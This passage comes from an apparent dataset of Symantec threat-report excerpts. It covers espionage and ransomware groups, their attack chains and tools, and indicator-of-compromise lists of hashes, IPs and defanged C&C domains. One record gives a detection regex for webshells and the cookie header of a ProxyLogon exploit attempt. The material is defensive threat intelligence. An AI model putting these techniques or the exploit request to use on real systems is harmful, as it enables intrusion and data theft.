leaving them inaccessible. If the victim has backup copies, they can restore their files once the infection has been cleaned up. However organizations should ensure that backups are appropriately protected or stored off-line so that attackers can't delete them.\nUsing cloud services could help mitigate ransomware infection, since many retain previous versions of files, allowing you to roll back to the unencrypted form.", "source": "Symentec"}, {"title": "Introduction", "content": "Chafer, the Iran-based targeted attack group, mounted further operations throughout 2017, attacking more organizations in the Middle East and beyond, and deploying several new tools. The group staged a number of ambitious new attacks last year, including the compromise of a major telecoms services provider in the region. There is also evidence that it attempted to attack a major international travel reservations firm. Chafer appears to be primarily engaged in surveillance and tracking of individuals, with most of its attacks likely carried out to gather information on targets or facilitate surveillance.\nChafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. At the time, many of its targets were individuals located in Iran, and it had already begun compromising telecom providers as well as airline companies in the Middle East region.", "source": "Symentec"}, {"title": "Targets", "content": "One of the organizations compromised by Chafer in 2017 was a telecoms services provider in the Middle East, which sells its solutions to multiple telecoms operators in the region. The ultimate goal of the attack may have been to facilitate surveillance of end-user customers of telecoms operators. By moving two steps up the supply chain the attackers could potentially have carried out surveillance on a vast pool of end-users.\nAlongside evidence of compromise of the organization itself, Symantec also found a copy of one of the company's own files, relating to its messaging software, on a staging server used by Chafer. The file was in a directory alongside a number of hacking tools used by the attackers.\nA second target outside the Middle East provides further confirmation of Chafer's heightened ambitions in recent times. Symantec found evidence that it had tried to compromise a large international travel reservations firm. There was no indication that the attack was successful, but Chafer did successfully infiltrate an African airline that is a customer of the reservations firm.", "source": "Symentec"}, {"title": "Targets", "content": "In the earlier attacks from 2015, Symantec found evidence that Chafer had been compromising targeted organizations by attacking their web servers, likely through SQL injection attacks, in order to drop malware onto them. In 2017, the group added a new infection method to its toolkit, using malicious documents which are likely circulated using spear-phishing emails sent to individuals working in targeted organizations.\nThese documents were Excel spreadsheets. When opened, they downloaded a malicious VBS file that in turn ran a PowerShell script. Several hours later, a dropper would appear on the compromised computer. This would install three files on the computer, an information stealer, a screen capture utility, and an empty executable.\nThe screen capture utility appeared to be used for initial information gathering, as it was only used briefly at the beginning of each infection and not seen again. The information stealer was capable of stealing the contents of the clipboard, taking screenshots, recording keystrokes and stealing files and user credentials. After this initial activity, the attackers usually downloaded more of their tools to the computer using a PowerShell downloader and began moving across the victim's network.", "source": "Symentec"}, {"title": "Introduction", "content": "Attackers deploying the Noberus (aka BlackCat, ALPHV) ransomware have been using new tactics, tools, and procedures (TTPs) in recent months, making the threat more dangerous than ever.\nAmong some of the more notable developments has been the use of a new version of the Exmatter data exfiltration tool, and the use of Eamfo, information-stealing malware that is designed to steal credentials stored by Veeam backup software.", "source": "Symentec"}, {"title": "Conclusion", "content": "There's no doubt that Coreid is one of the most dangerous and active ransomware developers operating at the moment. The group has been around since 2012, and became well-known for using its Carbanak malware to steal money from organizations worldwide, with the banking, hospitality and retail sectors among its preferred targets. Three members of the group were arrested in 2018, and in 2020 the group changed its tactics and launched its ransomware-as-a-service operation. Its continuous development of its ransomware and its affiliate programs indicates that this sophisticated and well-resourced attacker has little intention of going anywhere anytime soon.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "File hashes (SHA256)\nad5002c8a4621efbd354d58a71427c157e4b2805cb86f434d724fc77068f1c40 \u2013 Trojan.Exmatter\n8c5b108eab6a397bed4c099f13eed52aeeec37cc214423bde07544b44a62e74a \u2013 Ransom.Noberus\n78517fb07ee5292da627c234b26b555413a459f8d7a9641e4a9fcc1099f06a3d \u2013Infostealer.Eamfo\n9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732 \u2013Infostealer.Eamfo\ndf492b4cc7f644ad3e795155926d1fc8ece7327c0c5c8ea45561f24f5110ce54 \u2013Infostealer.Eamfo\n029dde7c2ec880fb3d3e95e6a8376739b4bc46a0ce24012e064b904e6ecb672c \u2013Ransom.Noberus\n72f0981f18b969db2781e874d249d8003c07f99786e217f84cf54a148de259cc \u2013Ransom.Noberus\n18c909a2b8c5e16821d6ef908f56881aa0ecceeaccb5fa1e54995935fcfd12f7 \u2013 GMER Driver\ne8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 \u2013 GMER\ned6275195cf9fd758fb7f8bce868c14dc9e9d6b7aa6f472f714bce5ed7fabf7f \u2013 Masqueraded PAExec\n5799d554307906e92749a0c45f21baff28d83b1cedccbf7cb6f2b98ac1b00930 \u2013 Masqueraded PAExec\nFile Names\nsync_enc.exe\nwithout_cert.exe\nvup.exe\nmorph.exe\nlocker.exe\nisgmer.exe\nkgeyauow.sys", "source": "Symentec"}, {"title": "Introduction", "content": "An unknown attacker is using a complex and powerful new malware loader in relatively unsophisticated and low-reward attacks, indicating they may not realize the potential capabilities of the malware they are deploying.\nThe malware, Trojan.Verblecon, is being used in attacks that appear to have installing cryptocurrency miners on infected machines as their end goal. There are some indications the attacker may also be interested in stealing access tokens for chat app Discord. However, the capabilities of this malware indicate that it could be highly dangerous if leveraged in ransomware or espionage campaigns.\nVerblecon was first spotted by analysts from Symantec, a division ofBroadcom Software, in January 2022. This blog will detail the capabilities of the malware.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\n32a9415daa7f37a93dd0b347461844673c0f5baf0c15c01ee48b147dadf28299\n3688c249774cc9a28d2b9b316921cec842bb087c57f4733cf5866226fbe2aeed\n5a4f6332ad08b35c055bb5e6dfddc79d2f7905e63fac7595efbedd0b27f12eb8\n007f5898c52c3aa1c3dca6d3a30f28f5f72d9789fbb440ae656d88959f68e53e\nf3f4af5f5eae1a28ad5a01b56d71302a265bce17d2c87ce731edf440612818a6\nhxxp://verble[.]software/styles.jar\nhxxps://jonathanhardwick[.]me/hardwick.jar\nhxxps://jonathanhardwick[.]me/hardwick.bin\nhxxps://jonathanhardwick[.]me/config.txt\nhxxp://test.verble[.]rocks/dorflersaladreviews.jar\nhxxp://test.verble[.]rocks/dorflersaladreviews.bin", "source": "Symentec"}, {"title": "Introduction", "content": "A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation.\nCompanies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs).\nThe scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it toCicada (aka APT10, Stone Panda, Cloud Hopper).Cicada has been involved in espionage-type operations since 2009, andU.S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government.\nCicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor.Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines.\nThe attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020.", "source": "Symentec"}, {"title": "Victims", "content": "This campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide.\nThe companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together. Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns. As is clear from the map inFigure 1, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China's borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization.\nWe also saw similar loaders on all the victim networks. These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including:\nAutomotive, with some manufacturers and organizations involved in supplying parts to the motor industry also targeted, indicating that this is a sector of strong interest to the attackers\nClothing\nConglomerates\nElectronics\nEngineering\nGeneral Trading Company\nGovernment\nIndustrial Products\nManaged Service Providers\nManufacturing\nPharmaceutical\nProfessional Services\nThe amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks. In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later.", "source": "Symentec"}, {"title": "Conclusion", "content": "Japan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity.\nCicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims.\nThe group's use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057d5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c18874326460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6acdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086ea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc427873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2edcf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab903ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239\n178.73.210.238188.119.112.225213.252.246.24545.14.224.9345.67.230.13481.7.7.15995.179.143.32", "source": "Symentec"}, {"title": "Introduction", "content": "The Buckeye attack group was using Equation Group tools to gain persistent access to target organizations at least a year prior to the Shadow Brokers leak.\nVariants of Equation Group tools used by Buckeye appear to be different from those released by Shadow Brokers, potentially indicating that they didn't originate from that leak.\nBuckeye's use of Equation Group tools also involved the exploit of a previously unknown Windows zero-day vulnerability. This zero day was reported by Symantec to Microsoft in September 2018 and patched in March 2019.\nWhile Buckeye appeared to cease operations in mid-2017, the Equation Group tools it used continued to be used in attacks until late 2018. It is unknown who continued to use the tools. They may have been passed to another group or Buckeye may have continued operating longer than supposed.\nThe 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years. Equation isregarded as one of the most technically adept espionage groupsand the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed. One of these tools, the EternalBlue exploit, was used to devastating effect in theMay 2017 WannaCry ransomware outbreak.\nHowever, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda)began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak.\nBeginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor.Doublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017. DoublePulsar was delivered to victims using a custom exploit tool (Trojan.Bemstour) that was specifically designed to install DoublePulsar.\nBemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. One vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec. The second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools-EternalRomance and EternalSynergy-that were also released as part of the Shadow Brokers leak.\nThe zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution. It was reported by Symantec to Microsoft in September 2018 andwas patched on March 12, 2019.\nHow Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown.\nBuckeye disappeared in mid-2017 and three alleged members of the group wereindicted in the U.S.in November 2017. However, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware.", "source": "Symentec"}, {"title": "Introduction", "content": "In July 2018, an attack on Singapore's largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information.\nWhitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts.", "source": "Symentec"}, {"title": "Targets", "content": "From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore.\nTo date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors.", "source": "Symentec"}, {"title": "Victims", "content": "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it's highly likely that they are sent to the victim using spear-phishing emails.\nIf opened, the dropper runs a loader known asTrojan.Vcrodaton the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor's component may be run with elevated privileges.\nOnce executed, Vcrodat loads an encrypted payload on to the victim's computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools.\nOnce the initial computer on the targeted organization's network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool.Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials.  They perform this tactic repeatedly until they gain access to the desired data.\nWhitefly usually attempts to remain within a targeted organization for long periods of time-often months-in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool.Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time.", "source": "Symentec"}, {"title": "Introduction", "content": "The Waterbug espionage group (aka Turla) has continued to attack governments and international organizations over the past eighteen months in a series of campaigns that have featured a rapidly evolving toolset and, in one notable instance, the apparent hijacking of another espionage group's infrastructure.", "source": "Symentec"}, {"title": "Victims", "content": "These three recent Waterbug campaigns have seen the group compromise governments and international organizations across the globe in addition to targets in the IT and education sectors. Since early 2018, Waterbug has attacked 13 organizations across 10 different countries:\nThe Ministry of Foreign Affairs of a Latin American country\nThe Ministry of Foreign Affairs of a Middle Eastern country\nThe Ministry of Foreign Affairs of a European country\nThe Ministry of the Interior of a South Asian country\nTwo unidentified government organizations in a Middle Eastern country\nOne unidentified government organization in a Southeast Asian country\nA government office of a South Asian country based in another country\nAn information and communications technology organization in a Middle Eastern country\nTwo information and communications technology organizations in two European countries\nAn information and communications technology organization in a South Asian country\nA multinational organization in a Middle Eastern country\nAn educational institution in a South Asian country", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "Campaign 1\n24fe571f3066045497b1d8316040734c81c71dcb1747f1d7026cda810085fad7\n66893ab83a7d4e298720da28cd2ea4a860371ae938cdd86035ce920b933c9d85\n7942eee31d8cb1c8853ce679f686ee104d359023645c7cb808361df791337145\n7bd3ff9ba43020688acaa05ce4e0a8f92f53d9d9264053255a5937cbd7a5465e\na1d9f5b9ca7dda631f30bd1220026fc8c3a554d61db09b5030b8eb9d33dc9356\nc63f425d96365d906604b1529611eefe5524432545a7977ebe2ac8c79f90ad7e\ncb7ecd6805b12fdb442faa8f61f6a2ee69b8731326a646ba1e8886f0a5dd61e0\ndb9902cb42f6dc9f1c02bd3413ab3969d345eb6b0660bd8356a0c328f1ec0c07\ne0c316b1d9d3d9ec5a97707a0f954240bbc9748b969f9792c472d0a40ab919ea\ne0c316b1d9d3d9ec5a97707a0f954240bbc9748b969f9792c472d0a40ab919ea\n5da013a64fd60913b5cb94e85fc64624d0339e09d7dce25ab9be082f0ca5e38b\nc8a864039f4d271f4ab6f440cbc14dffd8c459aa3af86f79f0619a13f67c309f\n588fd8eba6e62c28a584781deefe512659f6665daeb8c85100e0bf7a472ad825\ncda5b20712e59a6ba486e55a6ab428b9c45eb8d419e25f555ae4a7b537fc2f26\n694d9c8a1f0563c08e0d3ab7d402ffbf5a0fa11340c50fba84d709384ccef021\ncaaed70daa7832952ae93f41131e74dcb6724bb8669d18f28fbed4aa983fdc0c\n493eee2c55810201557ef0e5d134ca0d9569f25ae732df139bb0cb3d1478257f\n0e9c3779fece579bed30cb0b7093a962d5de84faa2d72e4230218d4a75ee82bc\n5bbeed53aaa40605aabbfde31cbfafd5b92b52720e05fa6469ce1502169177a0\nd153e4b8a11e2537ecf99aec020da5fad1e34bbe79f617a3ee5bc0b07c3abdca\nvision2030.tk\nvision2030.cf\ndubaiexpo2020.cf\nmicrosoft.updatemeltdownkb7234.com\ncodewizard.ml\nupdatenodes.site\nhttps://vision2030.tk/static/googleupdate.txt\nhttps://dubaiexpo2020.cf/counter.aspx\nhttps://microsoft.updatemeltdownkb7234.com/windows/update.aspx\nhttps://codewizard.ml/productivity/update.aspx\nCampaign 2\n10d1bfd5e8e1c8fa75756a9f1787c3179da9ab338a476f1991d9e300c6186575\n3fbec774da2a145974a917aeb64fc389345feb3e581b46d018077e28333601a5\n52169d7cdd01098efdde4da3fb22991aaa53ab9e02db5d80114a639bf65bce39\n56098ed50e25f28d466be78a36c643d19fedc563a2250ae86a6d936318b7f57e\n595a54f0bbf297041ce259461ae8a12f37fb29e5180705eafb3668b4a491cecc\n5dc26566b4dec09865ea89edd4f9765ef93e789870ed4c25fcc4ebad19780b40\n6b60b27385738cac65584cf7d486913ff997c66d97a94e1dde158c9cd03a4206\n846a95a26aac843d1fcec51b2b730e9e8f40032ee4f769035966169d68d144c4\nc4a6db706c59a5a0a29368f80731904cc98a26e081088e5793764a381708b1ea\nd0b99353cb6500bb18f6e83fe9eed9ce16e5a8d5b940181e5eafd8d82f328a59\nee7f92a158940a0b5d9b902eb0ed9a655c7e6ba312473b1e2c9ef80d58baa6dd\n94.249.192.182\nCampaign 3\n454e6c3d8c1c982cd301b4dd82ec3431935c28adea78ed8160d731ab0bed6cb7\n4ecb587ee9b872747408c00de5619cb6b973e7d39ce4937655c5d1a07b7500fc\n528e2567e24809d2d0ba96fd70e41d71c18152f0f0c4f29ced129ed7701fa42a\n6928e212874686d29c85eac72553ccdf89aacb475c61fa3c086c796df3ab5940\nb22bbda8f504f8cced886f566f954cc245f3e7c205e57139610bbbff0412611c\nd52b08dd27f2649bad764152dfc2a7dea0c8894ce7c20b51482f4a4cf3e1e792\ne7e41b3d7c0ee2d0939bb56d797eaf2dec44516ba54b8bf1477414b03d4d6e48\nec3da59d4a35941f6951639d81d1c5ff73057d9cf779428d80474e9656db427c\nfbefe503d78104e04625a511528584327ac129c3436e4df09f3d167e438a1862\nmarkham-travel.com\nzebra.wikaba.com\n185.141.62.32\n212.21.52.110", "source": "Symentec"}, {"title": "Introduction", "content": "Towards the end of the first quarter of 2020, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out.\nFrom COVID-19-themed malicious email and BEC scams to vulnerability exploits and IoT attacks, let's take a quick look at the trends that shaped the cyber security threat landscape in the first three months of 2020.", "source": "Symentec"}, {"title": "Victims", "content": "According to the FBI, business email compromise (BEC) scams are the most damaging and effective type of cyber crime, accounting for over $1.77 billion in losses for victims last year. While the number of organizations targeted by BEC scams was down from Q4 2019 numbers, there were still almost 31,000 organizations targeted in Q1 2020.", "source": "Symentec"}, {"title": "Introduction", "content": "Blog updated March 11: Case studies detailing post-compromise activity seen by Symantec added, along with additional IoCs\nBlog updated March 9: IoCs, additional signatures, and pre-exploitation process diagram added.\nUsers of Microsoft Exchange Server are advised to update to the latest version immediately, as a growing number of attackers are attempting to exploit four recently patched zero-day vulnerabilities in the software.\nMicrosoft released emergency patches last week (March 2) for the four vulnerabilities, which were being exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an advanced persistent threat (APT) group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, since then it has been reported that multiple threat actors have been rushing to exploit these vulnerabilities in Exchange Server.\nTwo of the vulnerabilities (CVE-2021-26855 and CVE-2021-27065) and the technique used to chain them together for exploitation have been given the name\"ProxyLogon\" by security company DevCore. Successful exploitation of ProxyLogon allows attackers to gain a foothold on a targeted network, potentially leading to further compromise and data exfiltration.\nSymantec customers are protected from attacks exploiting these vulnerabilities.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "The presence of the following indicators on your network may help you determine if you've already been exploited.\nProxyLogon\nFile indicators\nThe following regex can be used to help identify suspicious aspx/webshells:\n.*(\\\\aspnet_client\\\\|\\\\owa\\\\auth\\\\|\\\\ecp\\\\auth\\\\).*\\.aspx\nNetwork indicators\nA HTTP GET request for /owa/auth/x.js with the following cookie header set may indicate a possible exploit attempt:\nX-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3\nLog file indicators\nCheck for CMD output in Exchange's ECP Server logs:\nS:CMD=Set-OabVirtualDirectory.ExternalUrl=\nCheck IIS web server logs for following URI path:\n/ecp/DDI/DDIService.svc/SetObject\nMicrosoft Scanning Tool\nThis tool allows you to scan your Exchange Server logs to determine if your server was compromised.\nhttps://github.com/microsoft/CSS-Exchange/tree/main/Security", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has seen a major uptick in formjacking attacks recently, with publicly reported attacks on the websites of companies including Ticketmaster, British Airways, Feedify, and Newegg by a group called Magecart being the most notable examples.\nFormjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. Formjacking is not a new technique, but recent campaigns are interesting as they are large, sophisticated, and have increased dramatically since mid-August 2018.\nSymantec's Intrusions Prevention System (IPS) technology proactively protects website users from formjacking attacks.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec's Threat Hunter Team, a part ofBroadcom, recently observed the Syssphinx (aka FIN8) cyber-crime group deploying a variant of the Sardonic backdoor to deliver the Noberus ransomware.\nWhile analysis of the backdoor revealed it to be part of the Sardonic framework previously used by the group, and analyzed in a2021 report from Bitdefender, it seems that most of the backdoor's features have been altered to give it a new appearance.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nSHA256 file hashes:\n1d3e573d432ef094fba33f615aa0564feffa99853af77e10367f54dc6df95509 \u2013 PowerShell script\n307c3e23a4ba65749e49932c03d5d3eb58d133bc6623c436756e48de68b9cc45 \u2013 Hacktool.Mimikatz\n48e3add1881d60e0f6a036cfdb24426266f23f624a4cd57b8ea945e9ca98e6fd \u2013 DLL file\n4db89c39db14f4d9f76d06c50fef2d9282e83c03e8c948a863b58dedc43edd31 \u2013 32-bit shellcode\n356adc348e9a28fc760e75029839da5d374d11db5e41a74147a263290ae77501 \u2013 32-bit shellcode\ne7175ae2e0f0279fe3c4d5fc33e77b2bea51e0a7ad29f458b609afca0ab62b0b \u2013 32-bit shellcode\ne4e3a4f1c87ff79f99f42b5bbe9727481d43d68582799309785c95d1d0de789a \u2013 64-bit shellcode\n2cd2e79e18849b882ba40a1f3f432a24e3c146bb52137c7543806f22c617d62c \u2013 64-bit shellcode\n78109d8e0fbe32ae7ec7c8d1c16e21bec0a0da3d58d98b6b266fbc53bb5bc00e \u2013 64-bit shellcode\nede6ca7c3c3aedeb70e8504e1df70988263aab60ac664d03995bce645dff0935\n5b8b732d0bb708aa51ac7f8a4ff5ca5ea99a84112b8b22d13674da7a8ca18c28\n4e73e9a546e334f0aee8da7d191c56d25e6360ba7a79dc02fe93efbd41ff7aa4\n05236172591d843b15987de2243ff1bfb41c7b959d7c917949a7533ed60aafd9\nedfd3ae4def3ddffb37bad3424eb73c17e156ba5f63fd1d651df2f5b8e34a6c7\n827448cf3c7ddc67dca6618f4c8b1197ee2abe3526e27052d09948da2bc500ea\n0e11a050369010683a7ed6a51f5ec320cd885128804713bb9df0e056e29dc3b0\n0980aa80e52cc18e7b3909a0173a9efb60f9d406993d26fe3af35870ef1604d0\n64f8ac7b3b28d763f0a8f6cdb4ce1e5e3892b0338c9240f27057dd9e087e3111\n2d39a58887026b99176eb16c1bba4f6971c985ac9acbd9e2747dd0620548aaf3\n8cfb05cde6af3cf4e0cb025faa597c2641a4ab372268823a29baef37c6c45946\n72fd2f51f36ba6c842fdc801464a49dce28bd851589c7401f64bbc4f1a468b1a\n6cba6d8a1a73572a1a49372c9b7adfa471a3a1302dc71c4547685bcbb1eda432\nNetwork indicators:\n37.10.71[.]215 \u2013 C&C server\napi-cdn[.]net\ngit-api[.]com\napi-cdnw5[.]net\n104-168-237-21.sslip[.]io", "source": "Symentec"}, {"title": "Introduction", "content": "Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign.\nThe activity observed by Symantec, a division ofBroadcom Software, appears to be a continuation of activity documented in aGroup-IB report from November 2022. The activity documented by Group-IB spanned from mid-2019 to 2021, and it said that during that period this group, which it called OPERA1ER, stole at least $11 million in the course of 30 targeted attacks.\nSimilarities in the tactics, techniques, and procedures (TTPs) between the activity documented by Group-IB and the activity seen by Symantec include:\nSame domain seen in both sets of activity: personnel[.]bdm-sa[.]fr\nSome of the same tools used: Ngrok; PsExec; RDPWrap; Revealer Keylogger; Cobalt Strike Beacon\nNo custom malware found in either set of activity\nThe crossover in targeting of French-speaking nations in Africa\nBoth sets of activity also feature the use of industry-specific, and region-specific, domain names\nWhile this does appear to be a continuation of the activity documented by Group-IB, the activity seen by Symantec is more recent, running from at least July 2022 to September 2022, though some of the activity may have begun as far back as May 2022. Some new TTPs have also been employed in recent attacks, including:\nSome indications the attackers may have used ISO files as an initial infection vector\nThe use of the commodity malware GuLoader in the initial stages of the attack\nIndications the attackers have adopted the technique of abusing kernel drivers to disable defenses", "source": "Symentec"}, {"title": "Victims", "content": "Three different financial institutions in three African nations were compromised in the activity seen by Symantec, with multiple machines infected in all three organizations.\nThe activity on one of the infected institution's networks ran as follows:\nThe first activity was seen in mid-July 2022, when job-themed malware was spotted on the infected system. A downloader was then deployed, before the Sharphound hacktool was detected and a tool called fakelogonscreen was also deployed.\nAbout three weeks after the initial compromise of the network, the attackers were seen using a command prompt and PsExec for lateral movement. It appears the attackers were \"hands on keyboard\" at this point of the attack. The attackers used various dual-use and living-off-the-land tools for numerous purposes, including:\nQuser for user discovery\nPing for checking internet connectivity\nNgrok for network tunneling\nNet localgroup /add for adding users\nFortinet VPN client - likely for a secondary access channel\nXcopy to copy RDP wrapper files\nNetsh to open port 3389 in the firewall\nThe Autoupdatebat 'Automatic RDP Wrapper installer and updater' tool to enable multiple concurrent RDP sessions on a system\nSC privs to modify SSH agent permissions - this could have been tampering for key theft or installation of another channel\nMalicious tools used included:\nGuLoader\nMimikatz\nRevealer Keylogger\nBackdoor.Cobalt\nNetwire RAT\nThe malicious DLL and driver for killing processes\nMultiple other unknown files were also deployed on this network. The last activity seen on this network was in September 2022, but the Ngrok tunneling tool remained on the network until November 2022.\nSome of the same tools were also deployed on the other victims, with GuLoader seen in all three victims. Other activity linking the activity in all three victims includes:\nSame .NET downloader\nMalicious driver used\nAt least one overlapping transfer[.]sh URL", "source": "Symentec"}, {"title": "Conclusion", "content": "While Symantec cannot confirm whether or not Bluebottle successfully monetized the campaigns we saw it carrying out, the group's success at monetizing its activity between 2019 and 2021, as documented by Group-IB, indicates that this group has had a significant amount of success in the past.\nThe effectiveness of its campaigns means that Bluebottle is unlikely to stop this activity. It appears to be very focused on Francophone countries in Africa, so financial institutions in these countries should remain on high alert for the activity documented in this blog. The attackers appear to be French-speaking, so the possibility of them expanding this activity to French-speaking nations in other regions also cannot be ruled out.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "File hashes (SHA256)\n117c66c0aa3f7a5208b3872806d481fd8d682950573c2a7acaf7c7c7945fe10d - ZIP file\nc56c915cd0bc528bdb21d6037917d2e4cde18b2ef27a4b74a0420a5f205869e6 -  Infostealer\n91b3546dde60776ae3ed84fdf4f6b5fba7d39620f0a6307280265cde3a33206b - .NET downloader\n9c4c9fa4d8935df811cae0ce067de54ffdb5cfb4f99b4bc36c5aa2a1ac6f9c8f - .NET downloader\n1f6be4c29dfb50f924377444e5ca579d3020985a357533fc052226f0091febf6 - .NET downloader\nd5b8009dcb50aac8a889e24f038a52fe09721d142a3f1eaa74ac37fff45e9ba2 - .NET downloader\nae4ff662c959cf24df621a2c0b934ed1fa1c26a270a180f695cd5295579afbbd - .NET downloader\n0612ef9d2239edeab05f421e3188e2cfcadacbaeafbc9b8e35e778f7234aaa3b - .NET 